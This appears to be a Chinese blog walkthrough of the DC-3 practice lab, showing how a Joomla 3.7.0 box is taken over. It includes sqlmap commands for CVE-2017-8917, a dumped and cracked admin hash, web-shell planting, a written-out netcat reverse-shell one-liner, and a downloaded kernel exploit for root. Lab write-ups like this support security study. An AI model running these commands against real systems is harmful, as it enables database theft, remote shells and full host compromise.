> 环境

Kali Linux

DC-3靶场

---



## 信息收集

> 主机扫描

![image-20240405141542107](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405141542107.png)

通过Nmap扫描结果，可以看到，dc-3的ip；

> 端口扫描

![image-20240405141705277](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405141705277.png)

可以看到，该主机只开放了80端口，运行httpd服务；

访问httpd服务，并查看web框架

![image-20240405145646108](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405145646108.png)

可以看到，该CMS使用的是Joomla；

> 目录扫描

既然是Joomla，可以使用专用扫描器进行扫描

```sh
joomscan -u http://192.168.1.4
```

![image-20240405150250503](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405150250503.png)

可以发现，该Joomla版本为3.7.0，其后台网址为`http://192.168.1.4/administrator`尝试访问以下

![image-20240405143728405](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405143728405.png)

---



## 漏洞发现

已经知道了Joomla的版本，那么可以使用searchsploit工具查询该版本存在哪些漏洞，有什么利用方法

![image-20240405150409120](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405150409120.png)

查看 `php/webapps/42033.txt `文件，可以看到如下

![image-20240405152718429](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405152718429.png)

```
# CVE :  CVE-2017-8917

URL Vulnerable: 
http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27

Using Sqlmap:
sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

我们可以清楚的看到，该漏洞是一个编号为【[CVE-2017-8917](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917.html)】的SQL注入漏洞，并给出了两种注入方法

---



## 漏洞验证

> **根据searchsploit提供的注入方法，尝试使用sqlmap进行注入**

```sh
sqlmap -u "http://192.168.1.4/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]  

#该命令的目的是在给定的 URL 中检测 SQL 注入漏洞，并尝试获取目标数据库的名称。
#option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml"`：指定了目标网站的 URL
#--risk=3`：设置扫描的风险级别。`--risk` 参数用于指定 SQL 注入检测的风险级别，取值范围是 0-3，3 表示最高风险级别。
#--level=5`：设置扫描的深度级别。`--level` 参数用于指定 SQL 注入检测的深度级别，取值范围是 1-5，5 表示最高深度级别。
#--random-agent`：使用随机的 User-Agent 字符串，以尝试绕过一些基于 User-Agent 的检测或防护机制。
#--dbs`：告诉 SQLMap 扫描目标以获取数据库列表。`--dbs` 参数用于指示 SQLMap 在发现漏洞后尝试检索目标数据库的名称。
#-p list[fullordering]`：指定要测试的参数。`-p` 参数用于指定要测试的参数名称，这个参数被认为是潜在的注入点。
```

![image-20240405151919676](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405151919676.png)

可以看到，本注入语句成功获得五个库名, 由此可知，该【[CVE-2017-8917](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917.html)】的SQL注入漏洞真实存在；



## 漏洞利用

### 获取用户名和密码

在验证阶段我们已经获取了库名，我们选取joomladb数据库，查询该库下的所有表

```sh
sqlmap -u "http://192.168.1.4/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]
```

![image-20240405152051125](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405152051125.png)

可以发现，joomladb数据库下有很多表，正常情况，用户名和密码一般存储在users表中；所以我们继续查询users表中的字段；

```
sqlmap -u "http://192.168.1.4/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' --columns -p list[fullordering]
```

![image-20240405153150140](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405153150140.png)

可以看到，users表中的字段存在username和password字段；我们根据字段名继续查询数据；

```
sqlmap -u "http://192.168.1.4/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C username,password --dump -p list[fullordering]
```

![image-20240405153239537](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405153239537.png)

```
admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu 
```

经过 库,表,列,数据 ,我们成功查询到用户名和密码，由于该密码是加密的，所以我们需要解密；

---

首先将密码存到文件

![image-20240405153629618](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405153629618.png)

再使用john工具进行破解

![image-20240405154016685](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405154016685.png)

如此，成功的获得了账号和密码

```
admin : snoopy
```

尝试登录，我们可以成功进入该网页后台

![image-20240405154235830](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405154235830.png)

---



### 获取shell

在后台中，需要寻找文件的上传或编辑位置，将我们的一句话木马写入该服务；

经过一段查找，我们最后在templates里，点击左边第二个templates，点击Beez3，成功找到了文件编辑区域

![image-20240405154535323](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405154535323.png)

创建一个文件

![image-20240405154938762](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405154938762.png)

在该文件中写入一句话木马，用于蚁剑连接

![image-20240405162646905](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405162646905.png)

使用蚁剑连接

![image-20240405162722532](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405162722532.png)

可以看到，成功获取了shell，但权限不足，我们需要提权；

---



### 反弹shell

> 反弹shell  -建立shell通道 使用netcat

因为目标主机存在netcat，并且没有 -e参数，所以使用以下命令建立shell通道

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.1.9 1314 >/tmp/f

#rm /tmp/f：删除名为 `/tmp/f` 的文件，确保没有与后续命令冲突的临时文件。
#mkfifo /tmp/f：创建一个命名管道，即 `/tmp/f` 文件。命名管道是一种特殊的文件类型，允许进程之间进行双向通信。
#cat /tmp/f：从命名管道 `/tmp/f` 读取数据，并将其发送给后续的管道。
#/bin/bash -i 2>&1：启动一个交互式的 Bash Shell
#nc 192.168.1.9 1314：使用nc连接
```

![image-20240405163036787](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405163036787.png)

可以看到，主机侦听的1314端口已经和目标成功连接



### 权限提升

根据之前做的DC-1和DC-2，这里我们能想到用suid和git提权，但是经过尝试发现都不可行，所以尝试使用系统内核漏洞；

首先我们看下系统版本

![image-20240405163356367](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405163356367.png)

我们发现该系统为Ubuntu 16.04 ；再使用 searchsploit 工具查找系统漏洞

![image-20240405163645734](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405163645734.png)

可以看到，该系统存在大量的漏洞，我们选择 4.4.x那条；

查看39772.txt文件

```sh
searchsploit -x linux/local/39772.txt
```

![image-20240405165958574](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405165958574.png)

可以看到，该文件说明了EXP的使用方法，和下载链接，我们可以直接在反弹的shell中使用wget下载

```sh
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
```

![image-20240405164139762](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405164139762.png)

可以看到，成功下载，再进行解压

![image-20240405164323286](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405164323286.png)

解压成功后查看，发现其中有两个压缩包，根据前面的提示，我们再进行解压缩`exploit.tar`

![image-20240405164741543](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405164741543.png)

进入解压缩后形成的相应文件夹，执行sh文件

![image-20240405165241539](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405165241539.png)

![image-20240405165446258](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405165446258.png)

可以看到，两个sh脚本都执行成功；那么来测试是否拿到root权限

![image-20240405165652439](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405165652439.png)

如图，我们已经成功拿到root权限，并获取了flag；



















